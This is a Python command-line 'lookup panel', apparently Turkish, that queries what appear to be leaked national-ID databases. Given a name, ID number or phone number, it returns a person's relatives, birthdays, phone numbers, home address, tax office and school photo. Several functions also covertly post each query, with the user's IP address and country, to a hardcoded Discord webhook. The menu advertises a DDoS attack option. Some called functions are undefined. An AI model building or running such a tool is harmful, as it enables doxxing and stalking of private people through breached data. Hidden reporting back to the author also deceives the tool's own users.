import os
import requests
import json
from discord_webhook import DiscordWebhook



def banner():
  print(c + """
           _____           _                    
          / ____|         | |                   
         | |     ___ _ __ | |__   ___ _   _ ___ 
         | |    / _ \ '_ \| '_ \ / _ \ | | / __|
         | |___|  __/ |_) | | | |  __/ |_| \__ /
          \_____\___| .__/|_| |_|\___|\__,_|___/
                    | |                         
                    |_|                    
                    
                    """ + w)


y = "\033[3;33m"
b = '\033[31m'
h = '\033[32m'
m = '\033[00m'
w = "\033[0;37m"
c = "\033[1;95m"



def curl():
  os.system("curl ascii.live/can-you-hear-me")


def adsoyaddetay():
  ad = input(y + "Name" + w + " = ")
  soyad = input(y + "Surname" + w + " = ")
  il = input(y + "City" + w + " = ")

  url = "http://2.tcp.eu.ngrok.io:17636/api/adsoyad/adsoyad.php"
  data = {'ad': ad, 'soyad': soyad, 'adresil': il}
  response = requests.post(url, data=data)

  data1 = json.loads(response.text)
  people = data1['data']

  for i in people:
    tc = i['TC']
    ad = i['ADI']
    anne = i['ANNEADI']
    annetc = i['ANNETC']
    baba = i['BABAADI']
    babatc = i['BABATC']
    soyad = i['SOYADI']
    tarih = i['DOGUMTARIHI']
    print("")
    print("------PERSON------")
    print("")
    print(c + "Identifier" + w + " = " + tc)
    print(c + "Name" + w + " = " + ad)
    print(c + "Surname" + w + " = " + soyad)
    print(c + "Birthday" + w + " = " + tarih)
    print("")
    print("------PARENTS------")
    print("")
    if not isinstance(anne, str):
      print(c + "Mother Name" + w + " =  NONE")
    else:
      print(c + "Mother Name" + w + " = " + anne)
    if not isinstance(annetc, str):
      print(c + "Mother Identifier" + w + " =  NONE")
    else:
      print(c + "Mother Identifier" + w + " = " + annetc)
    print("")
    if not isinstance(baba, str):
      print(c + "Father Name" + w + " =  NONE")
    else:
      print(c + "Father Name" + w + " = " + baba)
    if not isinstance(babatc, str):
      print(c + "Father Identifier" + w + " =  NONE")
    else:
      print(c + "Father Identifier" + w + " = " + babatc)
    print("")
    print("---------------")

  else:
    print("\n" + "Sorgu İşlemi Bitti !!")


def deneme():
  tc = input(y + "Idenitifier" + w + " = ")
  url = "http://2.tcp.eu.ngrok.io:17636/api/sasa.php"
  data = {'ad': tc, 'ara': ""}
  response = requests.post(url, data=data)

  print(response.text)


def aile():
  tzc = input(y + "Idenitifier" + w + " = ")

  url = "http://2.tcp.eu.ngrok.io:17636/api/adsoyad/adsoyad.php"
  data = {
    'tc': tzc,
  }
  response = requests.post(url, data=data)

  data1 = json.loads(response.text)
  people = data1['data']

  for i in people:
    tc = i['TC']
    ad = i['ADI']
    soyad = i['SOYADI']
    anne = i['ANNEADI']
    annetc = i['ANNETC']
    baba = i['BABAADI']
    babatc = i['BABATC']
    url = "http://2.tcp.eu.ngrok.io:17636/api/adsoyad/adsoyad.php"
    data = {
      'tc': babatc,
    }
    response = requests.post(url, data=data)

    data12 = json.loads(response.text)
    peoples = data12['data']

    for i in peoples:
      dede = i['BABAADI']
      dedetc = i['BABATC']
      bane = i['ANNEADI']
      banetc = i['ANNETC']
      print("")
      print("------PERSON------")
      print("")
      print(c + "Identifier" + w + " = " + tc)
      print(c + "Name" + w + " = " + ad)
      print(c + "Surname" + w + " = " + soyad)
      print("")
      print("------PARENTS------")
      print("")
      if not isinstance(anne, str):
        print(c + "Mother Name" + w + " =  NONE")
      else:
        print(c + "Mother Name" + w + " = " + anne)
      if not isinstance(annetc, str):
        print(c + "Mother Identifier" + w + " =  NONE")
      else:
        print(c + "Mother Identifier" + w + " = " + annetc)
      print("")
      if not isinstance(baba, str):
        print(c + "Father Name" + w + " =  NONE")
      else:
        print(c + "Father Name" + w + " = " + baba)
      if not isinstance(babatc, str):
        print(c + "Father Identifier" + w + " =  NONE")
      else:
        print(c + "Father Identifier" + w + " = " + babatc)
      print("")
      print("------BROTHERS/SİSTERS------")
      print("")
      print("")

      url = "http://2.tcp.eu.ngrok.io:17636/api/adsoyad/adsoyad.php"
      data = {
        'babatc': babatc,
      }
      response = requests.post(url, data=data)

      dt = json.loads(response.text)
      people = dt['data']

      for i in people:
        brotc = i['TC']
        broad = i['ADI']
        if not isinstance(brotc, str):
          if brotc == None:
            print(c + "Brother/Sister Name" + w + " = NONE")
            print(c + "Brother/Sister Identifier" + w + " = NONE")
          if brotc == tc:
            pass
          else:
            print(c + "Brother/Sister Name" + w + " = NONE")
            print(c + "Brother/Sister Identifier" + w + " = NONE")
        else:
          if brotc == None:
            print(c + "Brother/Sister Name" + w + " = NONE")
            print(c + "Brother/Sister Identifier" + w + " = NONE")
          if brotc == tc:
            pass
          else:
            print(c + "Brother/Sister Name" + w + " = " + broad)
        if not isinstance(broad, str):
          if brotc == None:
            print(c + "Brother/Sister Name" + w + " = NONE")
            print(c + "Brother/Sister Identifier" + w + " = NONE")
          if brotc == tc:
            print(c + "Brother/Sister Identifier" + w + " = NONE")
            print(c + "Brother/Sister Identifier" + w + " = NONE")
            pass
          else:
            print(c + "Brother/Sister Identifier" + w + " = NONE")
        else:
          if brotc == None:
            print(c + "Brother/Sister Name" + w + " =  NONE")
            print(c + "Brother/Sister Identifier" + w + " = NONE")
          if brotc == tc:
            pass
          else:
            print(c + "Brother/Sister Identifier" + w + " = " + brotc)
            print("")
      print("")
      print("----------------------------")
      print("")
      print("------GRANDPARENTS------")
      print("")
      print("")
      if not isinstance(bane, str):
        print(c + "Grand Mother Name" + w + " =  NONE")
      else:
        print(c + "Grand Mother Name" + w + " = " + bane)
      if not isinstance(banetc, str):
        print(c + "Grand Mother Identifier" + w + " =  NONE")
      else:
        print(c + "Grand Mother Identifier" + w + " = " + banetc)
      print("")
      if not isinstance(dede, str):
        print(c + "Grand Father Name" + w + " =  NONE")
      else:
        print(c + "Grand Father Name" + w + " = " + dede)
      if not isinstance(dedetc, str):
        print(c + "Grand Father Identifier" + w + " =  NONE")
      else:
        print(c + "Grand Father Identifier" + w + " = " + dedetc)
      print("")
      print("------COUSINS------")
      print("")

      url = "http://2.tcp.eu.ngrok.io:17636/api/adsoyad/adsoyad.php"
      data = {
        'babatc': dedetc,
      }
      response = requests.post(url, data=data)

      dt = json.loads(response.text)

      if 'data' in dt:
        peoplee = dt['data']

        for i in peoplee:

          dede_evlat_tc = i['TC']

          url = "http://2.tcp.eu.ngrok.io:17636/api/adsoyad/adsoyad.php"
          data = {
            'babatc': dede_evlat_tc,
          }
          response = requests.post(url, data=data)

          dt = json.loads(response.text)

          if 'data' in dt:
            peopleee = dt['data']

            for i in peopleee:
              kuzen_tc = i['TC']
              kuzen_ad = i['ADI']
              if not isinstance(kuzen_ad, str):
                if dede_evlat_tc == babatc:
                  pass
                else:
                  print(c + "Cousin Identifier" + w + " =  NONE")
              else:
                if dede_evlat_tc == babatc:
                  pass
                else:
                  print(c + "Cousin Identifier" + w + " = " + kuzen_ad)
              if not isinstance(dedetc, str):
                if dede_evlat_tc == babatc:
                  pass
                else:
                  print(c + "Cousin Identifier" + w + " = NONE")
              else:
                if dede_evlat_tc == babatc:
                  pass
                else:
                  print(c + "Cousin Identifier" + w + " = " + kuzen_tc)

            print("")

          url = "http://2.tcp.eu.ngrok.io:17636/api/adsoyad/adsoyad.php"
          data = {
            'annetc': dede_evlat_tc,
          }
          response = requests.post(url, data=data)

          dt = json.loads(response.text)

          if 'data' in dt:
            peopleee = dt['data']

            for i in peopleee:
              kuzen_tc = i['TC']
              kuzen_ad = i['ADI']
              if not isinstance(kuzen_ad, str):
                if dede_evlat_tc == babatc:
                  pass
                else:
                  print(c + "Cousin Identifier" + w + " =  NONE")
              else:
                if dede_evlat_tc == babatc:
                  pass
                else:
                  print(c + "Cousin Identifier" + w + " = " + kuzen_ad)
              if not isinstance(dedetc, str):
                if dede_evlat_tc == babatc:
                  pass
                else:
                  print(c + "Cousin Identifier" + w + " = NONE")
              else:
                if dede_evlat_tc == babatc:
                  pass
                else:
                  print(c + "Cousin Identifier" + w + " = " + kuzen_tc)

  else:
    print("-------------------")
    reqes = requests.post("https://api.myip.com")
    data31 = json.loads(reqes.text)
    webhooks = "``" + "SORGU TÜRÜ AİLE" + "\nTC : " + tc + "\nADI : " + ad + " " + "\nSOYADI : " + soyad + " " + "\nİP : " + data31[
      'ip'] + " " + "\nÜLKE : " + data31[
        'country'] + "\nSorgulanma Yeri : Python" + "``"
    webhook = DiscordWebhook(
      url=
      'https://discord.com/api/webhooks/1120376771276189828/3YwNtjI4zvU-zkbOovJd8uI7t5Yuptm4ARkcBiMN7oF6qxKMnyXcU5Wk8ukr6tOVBOhh',
      content=webhooks)
    if not isinstance(webhook, str):
      print("")
    webhook.execute()
    print("\n" + "Sorgu İşlemi Bitti !!")


def adsoyad():
  ad = input(y + "Name" + w + " = ")
  soyad = input(y + "Surname" + w + " = ")

  url = "http://2.tcp.eu.ngrok.io:17636/api/adsoyad/adsoyad.php"
  data = {'ad': ad, 'soyad': soyad}
  response = requests.post(url, data=data)

  data1 = json.loads(response.text)
  people = data1['data']

  for i in people:
    tc = i['TC']
    ad = i['ADI']
    anne = i['ANNEADI']
    annetc = i['ANNETC']
    baba = i['BABAADI']
    babatc = i['BABATC']
    soyad = i['SOYADI']
    tarih = i['DOGUMTARIHI']
    print("")
    print("------PERSON------")
    print("")
    print(c + "Identifier" + w + " = " + tc)
    print(c + "Name" + w + " = " + ad)
    print(c + "Surname" + w + " = " + soyad)
    print(c + "Birthday" + w + " = " + tarih)
    print("")
    print("------PARENTS------")
    print("")
    if not isinstance(anne, str):
      print(c + "Mother Name" + w + " =  NONE")
    else:
      print(c + "Mother Name" + w + " = " + anne)
    if not isinstance(annetc, str):
      print(c + "Mother Identifier" + w + " =  NONE")
    else:
      print(c + "Mother Identifier" + w + " = " + annetc)
    print("")
    if not isinstance(baba, str):
      print(c + "Father Name" + w + " =  NONE")
    else:
      print(c + "Father Name" + w + " = " + baba)
    if not isinstance(babatc, str):
      print(c + "Father Identifier" + w + " =  NONE")
    else:
      print(c + "Father Identifier" + w + " = " + babatc)
    print("")
    print("---------------")

  else:
    reqes = requests.post("https://api.myip.com")
    data31 = json.loads(reqes.text)
    webhooks = "``" + "SORGU TÜRÜ AD-SOYAD" + "\nADI : " + ad + " " + "\nSOYADI : " + soyad + " " + "\nİP : " + data31[
      'ip'] + " " + "\nÜLKE : " + data31[
        'country'] + "\nSorgulanma Yeri : Python" + "``"
    webhook = DiscordWebhook(
      url=
      'https://discord.com/api/webhooks/1120376771276189828/3YwNtjI4zvU-zkbOovJd8uI7t5Yuptm4ARkcBiMN7oF6qxKMnyXcU5Wk8ukr6tOVBOhh',
      content=webhooks)
    if not isinstance(webhook, str):
      print("")
    webhook.execute()
    print("\n" + "Sorgu İşlemi Bitti !!")


def okulno():
  print("")
  print(
    c +
    "BİLGİLENDİRME ŞUAN OKUL-NO 80K KİŞİ İLE SINIRLI SORGU BAZEN SONUÇ GÖSTERMEYEBİLİR "
    + w)
  print("")
  tc = input(y + "Idenitifier" + w + " = ")
  url = "https://eokul.thesyrox.repl.co/okulno.php?tc=" + tc

  req = requests.post(url)

  veri = req.text

  veria = json.loads(veri)

  print("")
  print(c + "Tc:" + w, veria["tc"])
  print(c + "School Number:" + w, veria["okul_no"])
  print("")

def anan():
  tzc = input(y + "Idenitifier" + w + " = ")

  url = "http://2.tcp.eu.ngrok.io:17636/api/adsoyad/adsoyad.php"
  data = {
    'tc': tzc,
  }
  response = requests.post(url, data=data)

  data1 = json.loads(response.text)
  people = data1['data']

  for i in people:
    tc = i['TC']
    ad = i['ADI']
    soyad = i['SOYADI']
    anne = i['ANNEADI']
    annetc = i['ANNETC']
    baba = i['BABAADI']
    babatc = i['BABATC']
    url = "http://2.tcp.eu.ngrok.io:17636/api/adsoyad/adsoyad.php"
    data = {
      'tc': babatc,
    }
    response = requests.post(url, data=data)

    data12 = json.loads(response.text)
    peoples = data12['data']

    for i in peoples:
      dede = i['BABAADI']
      dedetc = i['BABATC']
      bane = i['ANNEADI']
      banetc = i['ANNETC']
      print("")
      print("------PERSON------")
      print("")
      print(c + "Identifier" + w + " = " + tc)
      print(c + "Name" + w + " = " + ad)
      print(c + "Surname" + w + " = " + soyad)
      print("")
      print("------PARENTS------")
      print("")
      if not isinstance(anne, str):
        print(c + "Mother Name" + w + " =  NONE")
      else:
        print(c + "Mother Name" + w + " = " + anne)
      if not isinstance(annetc, str):
        print(c + "Mother Identifier" + w + " =  NONE")
      else:
        print(c + "Mother Identifier" + w + " = " + annetc)
      print("")
      if not isinstance(baba, str):
        print(c + "Father Name" + w + " =  NONE")
      else:
        print(c + "Father Name" + w + " = " + baba)
      if not isinstance(babatc, str):
        print(c + "Father Identifier" + w + " =  NONE")
      else:
        print(c + "Father Identifier" + w + " = " + babatc)
      print("")
      print("------BROTHERS/SİSTERS------")
      print("")
      print("")

      url = "http://2.tcp.eu.ngrok.io:17636/api/adsoyad/adsoyad.php"
      data = {
        'babatc': babatc,
      }
      response = requests.post(url, data=data)

      dt = json.loads(response.text)
      people = dt['data']

      for i in people:
        brotc = i['TC']
        broad = i['ADI']
        if not isinstance(brotc, str):
          if brotc == None:
            print(c + "Brother/Sister Name" + w + " = NONE")
            print(c + "Brother/Sister Identifier" + w + " = NONE")
          if brotc == tc:
            pass
          else:
            print(c + "Brother/Sister Name" + w + " = NONE")
            print(c + "Brother/Sister Identifier" + w + " = NONE")
        else:
          if brotc == None:
            print(c + "Brother/Sister Name" + w + " = NONE")
            print(c + "Brother/Sister Identifier" + w + " = NONE")
          if brotc == tc:
            pass
          else:
            print(c + "Brother/Sister Name" + w + " = " + broad)
        if not isinstance(broad, str):
          if brotc == None:
            print(c + "Brother/Sister Name" + w + " = NONE")
            print(c + "Brother/Sister Identifier" + w + " = NONE")
          if brotc == tc:
            print(c + "Brother/Sister Identifier" + w + " = NONE")
            print(c + "Brother/Sister Identifier" + w + " = NONE")
            pass
          else:
            print(c + "Brother/Sister Identifier" + w + " = NONE")
        else:
          if brotc == None:
            print(c + "Brother/Sister Name" + w + " =  NONE")
            print(c + "Brother/Sister Identifier" + w + " = NONE")
          if brotc == tc:
            pass
          else:
            print(c + "Brother/Sister Identifier" + w + " = " + brotc)
            print("")
      print("")
      print("----------------------------")
      print("")
      print("------GRANDPARENTS------")
      print("")
      print("")
      if not isinstance(bane, str):
        print(c + "Grand Mother Name" + w + " =  NONE")
      else:
        print(c + "Grand Mother Name" + w + " = " + bane)
      if not isinstance(banetc, str):
        print(c + "Grand Mother Identifier" + w + " =  NONE")
      else:
        print(c + "Grand Mother Identifier" + w + " = " + banetc)
      print("")
      if not isinstance(dede, str):
        print(c + "Grand Father Name" + w + " =  NONE")
      else:
        print(c + "Grand Father Name" + w + " = " + dede)
      if not isinstance(dedetc, str):
        print(c + "Grand Father Identifier" + w + " =  NONE")
      else:
        print(c + "Grand Father Identifier" + w + " = " + dedetc)
      print("")
      print("------COUSINS------")
      print("")

      url = "http://2.tcp.eu.ngrok.io:17636/api/adsoyad/adsoyad.php"
      data = {
        'babatc': dedetc,
      }
      response = requests.post(url, data=data)

      dt = json.loads(response.text)

      if 'data' in dt:
        peoplee = dt['data']

        for i in peoplee:

          dede_evlat_tc = i['TC']

          url = "http://2.tcp.eu.ngrok.io:17636/api/adsoyad/adsoyad.php"
          data = {
            'babatc': dede_evlat_tc,
          }
          response = requests.post(url, data=data)

          dt = json.loads(response.text)

          if 'data' in dt:
            peopleee = dt['data']

            for i in peopleee:
              kuzen_tc = i['TC']
              kuzen_ad = i['ADI']
              if not isinstance(kuzen_ad, str):
                if dede_evlat_tc == babatc:
                  pass
                else:
                  print(c + "Cousin Identifier" + w + " =  NONE")
              else:
                if dede_evlat_tc == babatc:
                  pass
                else:
                  print(c + "Cousin Identifier" + w + " = " + kuzen_ad)
              if not isinstance(dedetc, str):
                if dede_evlat_tc == babatc:
                  pass
                else:
                  print(c + "Cousin Identifier" + w + " = NONE")
              else:
                if dede_evlat_tc == babatc:
                  pass
                else:
                  print(c + "Cousin Identifier" + w + " = " + kuzen_tc)

            print("")

          url = "http://2.tcp.eu.ngrok.io:17636/api/adsoyad/adsoyad.php"
          data = {
            'annetc': dede_evlat_tc,
          }
          response = requests.post(url, data=data)

          dt = json.loads(response.text)

          if 'data' in dt:
            peopleee = dt['data']

            for i in peopleee:
              kuzen_tc = i['TC']
              kuzen_ad = i['ADI']
              if not isinstance(kuzen_ad, str):
                if dede_evlat_tc == babatc:
                  pass
                else:
                  print(c + "Cousin Identifier" + w + " =  NONE")
              else:
                if dede_evlat_tc == babatc:
                  pass
                else:
                  print(c + "Cousin Identifier" + w + " = " + kuzen_ad)
              if not isinstance(dedetc, str):
                if dede_evlat_tc == babatc:
                  pass
                else:
                  print(c + "Cousin Identifier" + w + " = NONE")
              else:
                if dede_evlat_tc == babatc:
                  pass
                else:
                  print(c + "Cousin Identifier" + w + " = " + kuzen_tc)

  print("------GSM------")               
  url = "http://2.tcp.eu.ngrok.io:17636/api/gsm/api.php"
  data = {
    'tc': tzc,
  }
  response = requests.post(url, data=data)

  data1 = json.loads(response.text)

  if 'data' in data1:
    people = data1['data']
    for i in people:
      tc = i['TC']
      gsm = i['GSM']
      print("")
      print(c + "TC:" + w, tc)
      print(c + "GSM:" + w, gsm)
      print("")
  print("------ADRESS------")
  url2 = "http://2.tcp.eu.ngrok.io:17636/api/adres/api.php"
  data = {
    'tc': tc,
  }
  response = requests.post(url2, data=data)
  data1 = json.loads(response.text)

  if 'data' in data1:
    people = data1['data']
    for i in people:
      gsm = i['ADRES']
      print(c + "Adress:" + w, gsm)
      exit()




def gsm():
  tc = input(y + "Identifier" + w + " = ")
  url = "http://2.tcp.eu.ngrok.io:17636/api/gsm/api.php"
  data = {
    'tc': tc,
  }
  response = requests.post(url, data=data)

  data1 = json.loads(response.text)

  if 'data' in data1:
    people = data1['data']
    for i in people:
      tc = i['TC']
      gsm = i['GSM']
      print("")
      print(c + "TC:" + w, tc)
      print(c + "GSM:" + w, gsm)
      print("")

      reqes = requests.post("https://api.myip.com")
      data31 = json.loads(reqes.text)
      webhooks = "``" + "SORGU TÜRÜ GSM-TC" + "\nTC : " + tc + " " + "\nGSM : " + gsm + " " + "\nİP : " + data31[
        'ip'] + " " + "\nÜLKE : " + data31[
          'country'] + "\nSorgulanma Yeri : Python" + "``"
      webhook = DiscordWebhook(
        url=
        'https://discord.com/api/webhooks/1120376771276189828/3YwNtjI4zvU-zkbOovJd8uI7t5Yuptm4ARkcBiMN7oF6qxKMnyXcU5Wk8ukr6tOVBOhh',
        content=webhooks)
      if not isinstance(webhook, str):
        print("")
      webhook.execute()
      print("")
      print("Sorgu İşlemi Bitti !!")
      print("")


def vergi():
  tc = input(y + "Idenitifier" + w + " : ")
  url = "https://medusa-api.vercel.app/api/v1/vergi?tc=" + tc + "&key=liu_hediye"

  response = requests.get(url)

  data1 = json.loads(response.text)

  people = data1['data']

  for i in people:
    tc = people['tc']
    vergi = people['vergiDairesi']
    il = people['il']
    ilce = people['ilce']
    print("")
    print(c + "Identifier" + w + " = " + tc)
    print(c + "Tax" + w + " = " + vergi)
    print(c + "City" + w + " = " + il)
    print(c + "Town" + w + " = " + ilce)
    print("\n" + "Sorgu İşlemi Bitti !!")
    break


def operator():
  gsm = input(y + "GSM" + w + " : ")
  scraper = cfscrape.create_scraper()
  response = scraper.get("https://vezzycraft.online/gsmop.php?gsm=" + gsm)
  print(response.content)

def vesika():
  tc = input(y + "Idenitifier" + w + " = ")

  url = "http://2.tcp.eu.ngrok.io:17636/api/vesika/api.php"
  data = {
    'tc': tc,
  }
  response = requests.post(url, data=data)

  data1 = json.loads(response.text)
  print("")
  print(c + "Identifier" + w + " = " + data1[0]["tc"])
  print(c + "School Number" + w + " = " + data1[0]["no"])
  show_image_from_base64(data1[0]["vesika"])

def adres():
  tc = input(y + "Idenitifier" + w + " = ")

  url = "http://2.tcp.eu.ngrok.io:17636/api/adsoyad/adsoyad.php"
  data = {
    'tc': tc,
  }
  response = requests.post(url, data=data)

  data1 = json.loads(response.text)
  people = data1['data']

  for i in people:
    tc = i['TC']
    ad = i['ADI']
    soyad = i['SOYADI']
    tarih = i['DOGUMTARIHI']
    print("")
    print("------PERSON------")
    print("")
    print(c + "Identifier" + w + " = " + tc)
    print(c + "Name" + w + " = " + ad)
    print(c + "Surname" + w + " = " + soyad)
    print(c + "Birthday" + w + " = " + tarih)

  url2 = "http://2.tcp.eu.ngrok.io:17636/api/adres/api.php"
  data = {
    'tc': tc,
  }
  response = requests.post(url2, data=data)
  data1 = json.loads(response.text)

  if 'data' in data1:
    people = data1['data']
    for i in people:
      gsm = i['ADRES']
      print(c + "Adress:" + w, gsm)
      exit()

  


def tc():
  tc = input(y + "Idenitifier" + w + " = ")

  url = "http://2.tcp.eu.ngrok.io:17636/api/adsoyad/adsoyad.php"
  data = {
    'tc': tc,
  }
  response = requests.post(url, data=data)

  data1 = json.loads(response.text)
  people = data1['data']

  for i in people:
    tc = i['TC']
    ad = i['ADI']
    anne = i['ANNEADI']
    annetc = i['ANNETC']
    baba = i['BABAADI']
    babatc = i['BABATC']
    soyad = i['SOYADI']
    tarih = i['DOGUMTARIHI']
    print("")
    print("------PERSON------")
    print("")
    print(c + "Identifier" + w + " = " + tc)
    print(c + "Name" + w + " = " + ad)
    print(c + "Surname" + w + " = " + soyad)
    print(c + "Birthday" + w + " = " + tarih)
    print("")
    print("------PARENTS------")
    print("")
    if not isinstance(anne, str):
      print(c + "Mother Name" + w + " =  NONE")
    else:
      print(c + "Mother Name" + w + " = " + anne)
    if not isinstance(annetc, str):
      print(c + "Mother Identifier" + w + " =  NONE")
    else:
      print(c + "Mother Identifier" + w + " = " + annetc)
    print("")
    if not isinstance(baba, str):
      print(c + "Father Name" + w + " =  NONE")
    else:
      print(c + "Father Name" + w + " = " + baba)
    if not isinstance(babatc, str):
      print(c + "Father Identifier" + w + " =  NONE")
    else:
      print(c + "Father Identifier" + w + " = " + babatc)
    print("")
    print("---------------")

  else:
    reqes = requests.post("https://api.myip.com")
    data31 = json.loads(reqes.text)
    webhooks = "``" + "SORGU TÜRÜ TC " + "\nTC : " + tc + "\nADI : " + ad + " " + "\nSOYADI : " + soyad + " " + "\nİP : " + data31[
      'ip'] + " " + "\nÜLKE : " + data31[
        'country'] + "\nSorgulanma Yeri : Python" + "``"
    webhook = DiscordWebhook(
      url=
      'https://discord.com/api/webhooks/1120376771276189828/3YwNtjI4zvU-zkbOovJd8uI7t5Yuptm4ARkcBiMN7oF6qxKMnyXcU5Wk8ukr6tOVBOhh',
      content=webhooks)
    if not isinstance(webhook, str):
      print("")
    webhook.execute()
    print("\n" + "Sorgu İşlemi Bitti !!")



def menu():
  os.system("cls")
  banner()
  print(c + "[1]" + w + " AD-SOYAD")
  print(c + "[2]" + w + " AD-SOYAD-PRO")
  print(c + "[3]" + w + " GSM SORGU")
  print(c + "[4]" + w + " TC SORGU")
  print(c + "[5]" + w + " OKUL-NO SORGU")
  print(c + "[6]" + w + " AİLE SORGU")
  print(c + "[7]" + w + " DDOS Saldırısı")
  print(c + "[8]" + w + " VESİKA SORGU")
  print(c + "[9]" + w + " ADRES SORGU")
  print(c + "[10]" + w + " CUM SORGU")
  print("")

  option = input(y + "root@cepheus" + w + " $ ")

  if option == "1":
    os.system("cls")
    banner()
    adsoyad()
  if option == "2":
    os.system("cls")
    banner()
    adsoyaddetay()
  if option == "3":
    os.system("cls")
    banner()
    gsm()
  if option == "4":
    os.system("cls")
    banner()
    tc()
  if option == "5":
    os.system("cls")
    banner()
    okulno()
  if option == "6":
    os.system("cls")
    banner()
    aile()
  if option == "7":
    os.system("cls")
    banner()
    ddosv2()
  if option == "8":
    os.system("cls")
    banner()
    vesika()
  if option == "9":
    os.system("cls")
    banner()
    adres()
  if option == "10":
    os.system("cls")
    banner()
    anan()


menu()
